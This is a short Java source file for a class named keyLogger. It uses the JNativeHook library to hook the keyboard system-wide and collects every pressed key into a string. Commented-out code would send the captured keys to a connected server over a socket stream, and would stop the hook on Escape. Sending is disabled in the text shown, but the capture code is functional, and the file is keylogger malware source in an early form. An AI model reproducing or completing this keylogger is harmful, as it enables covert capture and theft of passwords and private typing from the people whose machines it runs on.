import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;

class keyLogger implements NativeKeyListener {
    Server server;
   // @Override
    public keyLogger(Server server){
        this.server=server;
    }
    String key = "";
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {

    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {

         key += NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
       //  if (NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()).equals("ESCAPE")){


        //System.out.println(key);
/*        if (key.equals("ESC")){
            //Server.out.writeUTF("Esc");
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e) {
                throw new RuntimeException(e);
            }
        }*/

        /*// Send key to client
        try{
            server.out.writeUTF(key);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }*/



    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
    }


}